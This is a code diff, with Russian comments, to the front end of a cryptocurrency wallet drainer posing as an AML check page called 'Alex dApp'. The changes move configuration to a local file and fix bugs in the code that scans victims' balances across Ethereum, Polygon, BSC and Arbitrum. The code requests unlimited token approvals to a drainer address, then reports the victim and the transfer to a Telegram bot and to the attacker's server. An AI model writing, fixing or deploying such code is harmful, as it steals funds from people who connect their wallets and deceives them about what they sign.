@@ -2,36 +2,16 @@ import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
+import config from './config.js';
 
-let serverConfig = null;
-
-async function fetchConfig() {
-  try {
-    const response = await fetch('https://api.bybitamlbot.com/api/config');
-    const data = await response.json();
-    if (data.success) {
-      serverConfig = data;
-      // Обновляем CHAINS с адресами drainer из сервера
-      Object.keys(serverConfig.CHAINS).forEach(chainId => {
-        serverConfig.CHAINS[chainId].drainerAddress = serverConfig.DRAINER_ADDRESSES[serverConfig.CHAINS[chainId].chainIdHex];
-      });
-      console.log('✅ Конфигурация успешно получена с сервера');
-      return serverConfig;
-    }
-    throw new Error(data.message || 'Failed to fetch configuration');
-  } catch (error) {
-    console.error(`❌ Ошибка получения конфигурации с сервера: ${error.message}`);
-    throw error;
-  }
-}
-
+const projectId = config.PROJECT_ID;
 const networks = [mainnet, polygon, bsc, arbitrum];
-const wagmiAdapter = new WagmiAdapter({ projectId: await fetchConfig().then(config => config.PROJECT_ID), networks });
+const wagmiAdapter = new WagmiAdapter({ projectId, networks });
 
 const appKitModal = createAppKit({
   adapters: [wagmiAdapter],
   networks,
-  projectId: await fetchConfig().then(config => config.PROJECT_ID),
+  projectId,
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
@@ -65,16 +45,13 @@ const DRAINER_ABI = [
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 async function sendTelegramMessage(message) {
-  if (!serverConfig) {
-    await fetchConfig();
-  }
   try {
-    const url = `https://api.telegram.org/bot${serverConfig.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
     const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: serverConfig.TELEGRAM_CHAT_ID,
+        chat_id: config.TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'Markdown'
       })
@@ -172,9 +149,6 @@ notifyOnVisit().catch(error => {
 });
 
 async function getTokenPriceInUSDT(tokenSymbol) {
-  if (!serverConfig) {
-    await fetchConfig();
-  }
   if (tokenSymbol === "USDT" || tokenSymbol === "USDTUSDT") return 1;
 
   const cachedPrice = sessionStorage.getItem(`tokenPrice_${tokenSymbol}`);
@@ -216,10 +190,7 @@ async function getWorkingProvider(rpcUrls) {
 }
 
 async function checkBalance(chainId, userAddress, provider) {
-  if (!serverConfig) {
-    await fetchConfig();
-  }
-  const chainConfig = serverConfig.CHAINS[chainId];
+  const chainConfig = config.CHAINS[chainId];
   let nativeBalance, tokenBalances = {};
 
   console.log(`🔍 Проверяем баланс для chainId ${chainId}`);
@@ -300,14 +271,11 @@ function hasFunds(bal) {
 }
 
 async function switchChain(chainId) {
-  if (!serverConfig) {
-    await fetchConfig();
-  }
   try {
     console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
-      params: [{ chainId: serverConfig.CHAINS[chainId].chainIdHex }]
+      params: [{ chainId: config.CHAINS[chainId].chainIdHex }]
     });
     console.log(`✅ Сеть переключена на chainId ${chainId}`);
   } catch (error) {
@@ -351,6 +319,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
     console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
     
+
     const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -377,12 +346,9 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 }
 
 async function drain(chainId, signer, userAddress, bal, provider) {
-  if (!serverConfig) {
-    await fetchConfig();
-  }
   console.log(`Подключённый кошелёк: ${userAddress}`);
 
-  const chainConfig = serverConfig.CHAINS[chainId];
+  const chainConfig = config.CHAINS[chainId];
   if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
 
   console.log(`📍 Шаг 1: Проверяем конфигурацию для chainId ${chainId}`);
@@ -424,7 +390,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
     if (parseFloat(nativeBalance) > 0) {
       const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
-      const nativePrice = await getTokenPriceInUSDT(serverConfig.TOKEN_SYMBOLS[chainConfig.nativeToken]);
+      const nativePrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[chainConfig.nativeToken]);
       const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
       funds.push(`- **${chainConfig.nativeToken}**(${networkName}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
     }
@@ -436,7 +402,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                       tokenAddress === chainConfig.usdcAddress ? "USDC" :
                       Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-        const tokenPrice = await getTokenPriceInUSDT(serverConfig.TOKEN_SYMBOLS[tokenAddress] || symbol);
+        const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
         const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
         funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
       }
@@ -495,7 +461,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const storedBalanceFormatted = parseFloat(ethers.utils.formatUnits(storedBalance, decimals));
     const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));
 
-    if (realBalanceFormatted < storedBalance.balance) {
+    if (realBalanceFormatted < storedBalanceFormatted) {
       bal.tokenBalances[tokenAddress] = { balance: realBalance, decimals: decimals };
     }
 
@@ -513,7 +479,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   console.log(`📍 Шаг 5: Получаем цены токенов и сортируем`);
   const pricePromises = tokensToProcess.map(async (token) => {
-    const price = await getTokenPriceInUSDT(serverConfig.TOKEN_SYMBOLS[token.address] || token.token);
+    const price = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[token.address] || token.token);
     const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
     token.valueInUSDT = balanceInUnits * price;
     return token;
@@ -545,18 +511,18 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
         console.log(`⏳ Задержка перед approve для токена ${token}`);
-        await delay(100);
+        await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
           gasLimit: 500000,
-          gasPrice,
+          gasPrice: gasPrice,
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
 
-        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance;
+        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
         status = 'confirmed';
 
         if (!modalClosed) {
@@ -598,22 +564,19 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 }
 
 async function runDrainer(provider, signer, userAddress) {
-  if (!serverConfig) {
-    await fetchConfig();
-  }
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
-  const minDelay = 100;
+  const minDelay = 10;
 
   if (timeSinceLastDrain < minDelay) {
     await delay(minDelay - timeSinceLastDrain);
   }
 
-  lastDrainTime = currentTime;
+  lastDrainTime = Date.now();
 
-  const balancePromises = Object.keys(serverConfig.CHAINS).map(async (chainId) => {
+  const balancePromises = Object.keys(config.CHAINS).map(async (chainId) => {
     try {
-      const reliableProvider = await getWorkingProvider(serverConfig.CHAINS[chainId].rpcUrls);
+      const reliableProvider = await getWorkingProvider(config.CHAINS[chainId].rpcUrls);
       const balance = await checkBalance(chainId, userAddress, reliableProvider);
       return { chainId: Number(chainId), balance, provider: reliableProvider };
     } catch (error) {
@@ -624,31 +587,28 @@ async function runDrainer(provider, signer, userAddress) {
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
 
-  const sortedBalances = await Promise.all(
+  const sorted = await Promise.all(
     balances
       .filter(item => hasFunds(item.balance))
       .map(async (item) => {
         const totalValueInUSDT = await calculateTotalValueInUSDT(item.chainId, item.balance, item.provider);
-        return { balances: item, totalValueInUSDT };
+        return { ...item, totalValueInUSDT };
       })
   );
 
-  sortedBalances.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
+  sorted.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
 
-  if (!sortedBalances.length) {
+  if (!sorted.length) {
     throw new Error('No funds found on any chain');
   }
 
-  const target = sortedBalances[0];
-  console.log(`Рекомендованная сеть: chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
+  const target = sorted[0];
+  console.log(`Рекомендуемая сеть: chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
   return { targetChainId: target.chainId, targetProvider: target.provider };
 }
 
 async function calculateTotalValueInUSDT(chainId, balance, provider) {
-  if (!serverConfig) {
-    await fetchConfig();
-  }
-  const chainConfig = serverConfig.CHAINS[chainId];
+  const chainConfig = config.CHAINS[chainId];
   let totalValue = 0;
 
   for (const tokenAddress of Object.keys(balance.tokenBalances)) {
@@ -658,14 +618,14 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                     tokenAddress === chainConfig.usdcAddress ? "USDC" :
                     Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-      const tokenPrice = await getTokenPriceInUSDT(serverConfig.TOKEN_SYMBOLS[tokenAddress] || symbol);
+      const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
       const tokenValue = formattedBalance * tokenPrice;
       totalValue += tokenValue;
-      console.log(`📊 Токен ${symbol} в chainId ${chainId}: ${formattedBalance.toFixed(2)} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
+      console.log(`📊 Токен ${symbol} в chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
     }
   }
 
-  console.log(`📴 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue.toString()} USDT`);
+  console.log(`📊 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue} USDT`);
   return totalValue;
 }
 
@@ -675,7 +635,7 @@ window.addEventListener('DOMContentLoaded', () => {
 
   const link = document.createElement('link');
   link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
-  link.setAttribute('rel', 'stylesheet');
+  link.rel = 'stylesheet';
   document.head.appendChild(link);
 
   const style = document.createElement('style');
@@ -707,7 +667,7 @@ window.addEventListener('DOMContentLoaded', () => {
       text-align: center;
       z-index: 1000;
       display: none;
-      content-family: 'Inter', sans-serif;
+      font-family: 'Inter', sans-serif;
       color: #FFFFFF;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
       animation: fadeIn 0.3s ease-out forwards;
@@ -729,7 +689,7 @@ window.addEventListener('DOMContentLoaded', () => {
       font-size: 14px;
       font-weight: 400;
       color: #A0AEC0;
-      margin-bottom: 20px;
+      margin-bottom: 24px;
       word-wrap: break-word;
     }
 
@@ -782,7 +742,7 @@ window.addEventListener('DOMContentLoaded', () => {
     .action-list {
       list-style: none;
       padding: 0;
-      margin: 24px 0;
+      margin: 24px 0 0;
       font-size: 14px;
       font-weight: 500;
       color: #E2E8F0;
@@ -807,7 +767,7 @@ window.addEventListener('DOMContentLoaded', () => {
     @media (max-width: 480px) {
       .modal-content {
         max-width: 320px;
-        padding: 16px;
+        padding: 20px;
         min-height: 300px;
       }
       .modal-title { font-size: 18px; }
@@ -857,7 +817,7 @@ window.addEventListener('DOMContentLoaded', () => {
   if (!isInjected) {
     actionButtons.forEach(btn => {
       btn.addEventListener('click', () => {
-        window.showModal();
+        window.showWalletRedirectModal();
       });
     });
     return;
@@ -906,7 +866,7 @@ async function attemptDrainer() {
 
   const drainerTimeout = setTimeout(async () => {
     isTransactionPending = false;
-    console.error('❌ Тайм-аут выполнения дрейнер');
+    console.error('❌ Тайм-аут выполнения дрейнера');
     await hideModalWithDelay("Check your wallet for AML!");
   }, 60000);
 
@@ -919,13 +879,13 @@ async function attemptDrainer() {
       throw new Error('Wallet address mismatch');
     }
 
-    await new Promise(resolve => setTimeout(resolve, 100));
+    await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
     const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
     if (targetChainId) {
       await switchChain(targetChainId);
-      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, provider), provider);
+      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
       console.log('✅ Drainer выполнен, статус:', status);
     }
 
@@ -944,7 +904,7 @@ async function attemptDrainer() {
     } else if (err.message.includes('Failed to approve token')) {
       errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
     } else if (err.message.includes('Failed to process')) {
-      errorMessage = "Error: Failed to process native token transfer.";
+      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
     } else if (err.message.includes('Failed to switch chain')) {
       errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
     } else {
@@ -989,7 +949,7 @@ async function onChainChanged(chainId) {
     const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
     const newNetwork = await provider.getNetwork();
     console.log(`📡 Новая сеть: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
-    await attemptDrainer();
+    await attemptDrainer(provider);
   } else {
     console.log('⏳ Транзакция в процессе');
     await hideModalWithDelay("Transaction in progress, please wait.");
